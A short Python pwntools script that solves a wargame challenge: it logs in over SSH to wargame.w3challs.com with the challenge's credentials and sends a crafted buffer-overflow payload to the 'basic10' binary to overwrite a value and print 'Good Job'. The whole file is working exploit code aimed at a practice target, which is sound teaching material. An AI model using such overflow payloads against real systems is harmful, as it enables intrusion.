#!/usr/bin/python

from pwn import *

payload = "A" * 48 + "\x00" * 4 + "\x39" + "\x00" * 3 + "Good Job"

def exploit():
    io = ssh(host="wargame.w3challs.com", user="basic10", password="basic10", port=10101)
    sh = io.run("/home/basic10/basic10")
    sh.sendline(payload)
    log.success(sh.recvline())
    log.success(sh.recvline())
    io.close()

def main():
    exploit()

if __name__=="__main__":
    main()
